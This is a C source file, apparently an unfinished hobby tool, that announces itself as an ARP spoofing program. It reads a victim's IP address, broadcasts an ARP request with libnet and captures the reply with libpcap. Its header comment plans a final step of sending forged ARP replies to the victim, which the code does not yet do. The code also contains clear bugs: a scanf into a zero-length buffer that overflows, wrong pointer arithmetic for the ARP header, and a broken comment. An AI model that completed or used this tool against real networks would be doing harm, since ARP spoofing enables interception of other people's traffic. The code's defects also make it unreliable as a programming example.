#include <stdio.h>
#include <libnet.h>
#include <unistd.h>
#include <pcap.h>

/*
1. get Victim's ip address (done)
2. get my ip, mac, gateway(ip) address
3. get mac address of gateway and victim by using arp
4. send arp reply packet to victim
*/
void print_dotip4(u_int32_t ipaddr){
	unsigned char octet[4];
	for (int i=0; i<4; i++){
		octet[i] = (ipaddr >> (8*i)) & 0xFF;
	}
	printf("%d.%d.%d.%d\n", octet[3], octet[2], octet[1], octet[0]);
}

void callback(u_char *useless, const struct pcap_pkthdr* pkthdr, const u_char* packet){

	/* ethernet,ip,tcp header */
	libnet_ethernet_hdr* eth_hdr;
	libnet_arp_hdr* arp_hdr;

	const u_char* data;
	eth_hdr = (struct libnet_ethernet_hdr *) (packet);

	/* arp check*/
	if(ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP){
		/* get arp_hdr */
		arp_hdr = (struct libnet_arp_hdr *) (eth_hdr + 14);

		if(arp_hdr->ar_op == ARPOP_REPLY){
			data = ((u_char*)arp_hdr);
			for(u_int i=0; i<28;i++){
				if(isprint(*data))
					printf("%c",*data);
				else	
					printf(".");
				data++;
			}
		}
		
	}
}
int main(int argc, char *argv[]){

	pcap_t *handle;
	struct bpf_program fp;
	struct pcap_pkthdr header;
	bpf_u_int32 mask;
	bpf_u_int32 net;
	char filter_exp[] = "";

	u_int32_t my_ip, gateway_ip, victim_ip;
	libnet_t *l;
	libnet_ptag_t t;
	char dev[] = "eth0";
	u_int8_t *packet;
	u_int32_t packet_len;
	
	char errbuf[LIBNET_ERRBUF_SIZE];
	libnet_ether_addr* my_mac, gateway_mac, victim_mac;
	
	u_char broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
	
	//check sudo or not
	if (geteuid() != 0) {
		fprintf(stderr, "err: you must be root to run this\n");
		return -1;
	}
	/* Properties omission*/
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
		/*
	/* Open the session */
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	/* compile and apply the filter!! */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Coudln't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Coudln't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
	}


	//initialize
	l = libnet_init(LIBNET_LINK_ADV, dev, errbuf);

	if(l==NULL){
		fprintf(stderr, "%s", errbuf);
		return 2;
	}
	else{
		//get ip address
		printf("Hello. This is arp spoofing program\n");
		my_ip = libnet_get_ipaddr4(l);
		my_mac = libnet_get_hwaddr(l);
	}
	printf("Your IP address is ");
	print_dotip4(my_ip);

	//get victim's IP address
	printf("Victim IP address(XXX.XXX.XXX.XXX form) : ");
	char str[] = ""; //temp str to store data
	scanf("%s", str);
	victim_ip = inet_addr(str);
	
	printf("Making arp packet.......\n");
	//make arp packet
	t = libnet_autobuild_arp(ARPOP_REQUEST, //op
	my_mac->ether_addr_octet,//sha
	(u_int8_t *)&my_ip,//spa
	broadcast,//tha
	(u_int8_t *)&victim_ip,//tpa
	l);
	
	if(t==-1){
		fprintf(stderr, "Can't build ARP header: %s\n",libnet_geterror(l));
		return 2;
	}

	//attach ethernet
	t = libnet_autobuild_ethernet(broadcast,//dest
		ETHERTYPE_ARP,//p
		l);
	if(t==-1){
		fprintf(stderr, "Can't build ethernet header: %s\n",
		libnet_geterror(l));
		return 2;
	}	

	if(libnet_adv_cull_packet(l, &packet, &packet_len) == -1){
		fprintf(stderr, "%s", libnet_geterror(l));
	} else{
		fprintf(stderr, "packet size: %d\n", packet_len);
		libnet_adv_free_packet(l,packet);
	}
	
	//send
	printf("Sending arp packet....\n");
	int c = libnet_write(l);

	/* loop for 1 times to get arp reply */
	pcap_loop(handle,1,callback, NULL);


	if(c==-1){
		fprintf(stderr, "Write error:%s\n", libnet_geterror(l));
		return 2;
	}
	libnet_destroy(l);
	pcap_close(handle);
	return 0;
}
